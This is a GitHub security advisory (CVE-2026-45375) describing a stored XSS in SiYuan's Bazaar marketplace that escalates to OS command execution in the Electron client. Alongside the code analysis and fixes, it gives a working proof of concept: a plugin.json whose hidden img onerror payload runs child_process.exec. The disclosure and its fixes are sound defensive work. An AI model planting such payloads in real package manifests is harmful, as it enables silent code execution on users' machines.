# [C] SiYuan Bazaar marketplace renders unescaped package `name` and `version` metadata, allowing stored XSS and Electron code execution

## Summary
Severity: Critical
Advisory: GHSA-27qc-m5gf-jv5r
CVE: CVE-2026-45375
CWE: CWE-116, CWE-79
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-13
Source: https://github.com/advisories/GHSA-27qc-m5gf-jv5r
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0

## Details
### Summary

SiYuan's Bazaar (community marketplace) renders the `name` and `version` fields of a package's `plugin.json` (and the equivalent `theme.json` / `template.json` / `widget.json` / `icon.json`) into the Settings → Marketplace UI without HTML escaping. The kernel-side helper `sanitizePackageDisplayStrings` in `kernel/bazaar/package.go` HTML-escapes only `Author`, `DisplayName`, and `Description` — `Name` and `Version` flow through to the renderer raw. The frontend at `app/src/config/bazaar.ts` substitutes them into HTML template strings via `${item.preferredName}` / `${data.name}` / `v${data.version}` and assigns the result to `innerHTML`. As a consequence, malicious HTML in either field is parsed and executed when a user opens the marketplace tab.

Because the desktop client is built on Electron with `nodeIntegration: true`, `contextIsolation: false`, and `webSecurity: false` (`app/electron/main.js:407-411`), the resulting cross-site scripting executes in a renderer with full access to Node.js APIs, escalating directly to arbitrary OS command execution under the victim's account. The trigger is **zero-click on the list view** — opening Settings → Marketplace → Downloaded → Plugins is sufficient; no Install/Update click is required.

A second `preferredName` path exists: when `displayName: {}` (empty locale map), `GetPreferredLocaleString` falls back to the unescaped `pkg.Name`, so even a normal-looking visible plugin name carries the payload through the same sink.

### Details

**Server-side allowlist — `kernel/bazaar/package.go:134-145`:**
```go
func sanitizePackageDisplayStrings(pkg *Package) {
    if pkg == nil { return }
    pkg.Author = html.EscapeString(pkg.Author)
    for k, v := range pkg.DisplayName { pkg.DisplayName[k] = html.EscapeString(v) }
    for k, v := range pkg.Description { pkg.Description[k] = html.EscapeString(v) }
    // pkg.Name and pkg.Version are NOT escaped
}
```

**`PreferredName` fallback — `kernel/bazaar/installed.go:59` and `kernel/bazaar/package.go:148-162`:**
```go
// installed.go:59
pkg.PreferredName = GetPreferredLocaleString(pkg.DisplayName, pkg.Name)

// package.go:148-162
func GetPreferredLocaleString(m LocaleStrings, fallback string) string {
    if len(m) == 0 { return fallback }   // ← unescaped pkg.Name reaches the renderer
    if v := strings.TrimSpace(m[util.Lang]); v != "" { return v }
    if v := strings.TrimSpace(m["default"]);  v != "" { return v }
    if v := strings.TrimSpace(m["en_US"]);    v != "" { return v }
    return fallback
}
```

**Online marketplace path skips the kernel sanitizer — `kernel/bazaar/package.go:127` + `kernel/bazaar/bazaar.go:48`:**
```go
// package.go:127  (only the local install path calls sanitizePackageDisplayStrings)
sanitizePackageDisplayStrings(ret)
```
`buildBazaarPackageWithMetadata` (`bazaar.go:48`), used to build the online marketplace listing, does **not** call the kernel's `sanitizePackageDisplayStrings`. Sanitization for the online stage is delegated to the `siyuan-note/bazaar` GitHub-Action workflow.

**The upstream workflow has the same gap — `siyuan-note/bazaar/actions/stage/main.go:897-909`:**
```go
// sanitizePackageDisplayStrings 对集市包直接显示的信息做 HTML 转义，避免 XSS。
// （跟思源内核 kernel/bazaar/package.go 保持一致）
func sanitizePackageDisplayStrings(pkg *Package) {
    if pkg == nil { return }
    pkg.Author = html.EscapeString(pkg.Author)
    for k, v := range pkg.DisplayName { pkg.DisplayName[k] = html.EscapeString(v) }
    for k, v := range pkg.Description { pkg.Description[k] = html.EscapeString(v) }
}
```
The function is byte-identical to the kernel helper — the Chinese comment translates to *"(kept in sync with the SiYuan kernel kernel/bazaar/package.go)"*. It is invoked at `main.go:707, 715, 723` once per package type during staging. `Name`, `Version`, and `Keywords` are unescaped at **both** layers: the kernel for local installs, the workflow for online listings. A malicious `plugin.json` submitted to the public bazaar therefore propagates the unsanitized fields to every SiYuan client that fetches the marketplace listing.

**Frontend sinks — `app/src/config/bazaar.ts`:**
```ts
// :430 — installed-plugin card list (zero-click)
${item.preferredName}

// :526 — package detail view
<a href="${data.repoURL}" ... title="GitHub Repo">${data.name}</a>

// :540 — package detail view, version stripe
<div ... style="line-height: 20px;">${window.siyuan.languages.currentVer}<br>v${data.version}</div>
```
The constructed template strings are subsequently assigned to `bazaar.element.innerHTML` / `readmeElement.innerHTML` / `mdElement.innerHTML` (lines 358, 472, 512, 600).

**Renderer privilege boundary — `app/electron/main.js:407-411`:**
```js
webPreferences: {
    nodeIntegration: true,
    webviewTag: true,
    webSecurity: false,
    contextIsolation: false,
}
```
JavaScript executing in the marketplace tab can call `require('child_process').exec(...)` directly, escalating DOM XSS to OS command execution.

### PoC

End-to-end verified against the official `b3log/siyuan:v3.6.5` Docker image. The browser leg uses Brave; the alert below is the safe-mode equivalent of the Electron `child_process.exec` payload.

**1. Run a stock SiYuan v3.6.5 kernel:**
```sh
mkdir -p /tmp/siyuan-poc-ws/data/plugins/evil-plugin
docker run -d --name siyuan-poc -p 16806:6806 \
  -v /tmp/siyuan-poc-ws:/siyuan/workspace \
  -e SIYUAN_ACCESS_AUTH_CODE=test123 \
  b3log/siyuan:v3.6.5 \
  --workspace=/siyuan/workspace --accessAuthCode=test123
```

**2. Plant a malicious plugin manifest at `/tmp/siyuan-poc-ws/data/plugins/evil-plugin/plugin.json`:**
```json
{
  "name": "Markdown Utilities<img src=x onerror=\"alert(`SiYuan Bazaar XSS`)\" style=\"display:none\">",
  "displayName": {},
  "description": {"default": "A small toolkit of markdown helpers - table sort, link checker, wordcount, etc."},
  "author": "markdown-utils",
  "version": "1.4.2",
  "url": "https://github.com/markdown-utils/markdown-utilities",
  "backends": ["all"],
  "frontends": ["all"]
}
```
The visible portion of the `name` field is the literal string `Markdown Utilities`. The `<img>` tag is rendered with `display:none`, so the marketplace card looks like a legitimate plugin entry — no broken-image icon, no suspicious text.

**3. Verify the kernel returns the unescaped payload:**

Authenticate via `http://127.0.0.1:16806/` (auth code `test123`), then call the API as the logged-in user:
```sh
curl -s -b 'siyuan=<session-cookie>' \
  -X POST http://127.0.0.1:16806/api/bazaar/getInstalledPlugin \
  -H 'Content-Type: application/json' \
  -d '{"frontend":"desktop","keyword":""}'
```
Observed (verbatim):
```json
{
  "preferredName": "Markdown Utilities<img src=x onerror=\"alert(`SiYuan Bazaar XSS`)\" style=\"display:none\">",
  "name":          "Markdown Utilities<img src=x onerror=\"alert(`SiYuan Bazaar XSS`)\" style=\"display:none\">",
  "version":       "1.4.2"
}
```
The HTML payload arrives at the client unmodified.

**4. Trigger via the UI:**

In a browser logged into the running SiYuan instance, open Settings → Marketplace → Downloaded → Plugins. The marketplace card list renders, `bazaar.ts:430` substitutes `${item.preferredName}` into the card HTML, the result is assigned to `bazaar.element.innerHTML`, the browser parses the `<img>` element, fails to load `src=x`, fires `onerror`, and **`alert("SiYuan Bazaar XSS")` pops**. The card itself displays as a normal-looking "Markdown Utilities" entry; the malicious markup is invisible.

**5. Electron RCE substitution:**

The same payload, modified for the Electron desktop client, replaces the alert with a Node-API call:
```json
"name": "Markdown Utilities<img src=x onerror=\"require(`child_process`).exec(`open -a Calculator`)\" style=\"display:none\">"
```
On any Electron-packaged SiYuan v3.6.5 (e.g. `siyuan-3.6.5-mac-arm64.dmg`), opening Settings → Marketplace → Downloaded → Plugins launches Calculator. The same primitive can run any shell command available to the desktop user.

### Impact

- **Stored XSS → arbitrary OS command execution** in the desktop Electron client under the victim's user account, with full filesystem and network access via Node.js APIs.
- **Triggers on view, not on install.** Opening Settings → Marketplace → Downloaded → Plugins is sufficient; the payload runs before any "Install" or "Update" button is clicked.
- **Visually undetectable.** The `display:none` style hides the malicious markup, so the marketplace card appears entirely legitimate.
- **Survives transport.** The payload is a plain JSON string; it round-trips through tarball packaging, sync replication, `.sy.zip` export/import, and any other workspace-content transport without modification.
- **Low attacker prerequisites.** Any path that gets a manifest into the workspace plugin directory triggers the bug. The Bazaar marketplace itself — both the install flow and the post-listing release-then-poison flow — is the canonical low-friction delivery channel.

### Suggested fix

Primary: extend the kernel allowlist in `kernel/bazaar/package.go:134-145`:
```diff
 func sanitizePackageDisplayStrings(pkg *Package) {
     if pkg == nil { return }
     pkg.Author = html.EscapeString(pkg.Author)
+    pkg.Name    = html.EscapeString(pkg.Name)
+    pkg.Version = html.EscapeString(pkg.Version)
     for k, v := range pkg.DisplayName { pkg.DisplayName[k] = html.EscapeString(v) }
     for k, v := range pkg.Description { pkg.Description[k] = html.EscapeString(v) }
+    for i, kw := range pkg.Keywords    { pkg.Keywords[i]   = html.EscapeString(kw) }
 }
```

Secondary: also call `sanitizePackageDisplayStrings` from `kernel/bazaar/bazaar.go:48` (`buildBazaarPackageWithMetadata`) so that the kernel applies the same protection regardless of whether metadata originates from a local install or the online stage. The same two-line addition is needed in the upstream workflow at `siyuan-note/bazaar/actions/stage/main.go:897-909` (already explicitly committed to "kept in sync with the SiYuan kernel kernel/bazaar/package.go").

Tertiary (defense in depth): wrap the frontend sinks in `app/src/config/bazaar.ts` (`${item.preferredName}`, `${data.name}`, `${data.version}`) with the existing `escapeHtml(...)` helper.

Renderer hardening: switching the main BrowserWindow at `app/electron/main.js:407-411` to `contextIsolation: true` with a preload bridge would bound any future XSS in the renderer to DOM impact instead of OS command execution.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-27qc-m5gf-jv5r
- https://nvd.nist.gov/vuln/detail/CVE-2026-45375
- https://github.com/siyuan-note/siyuan
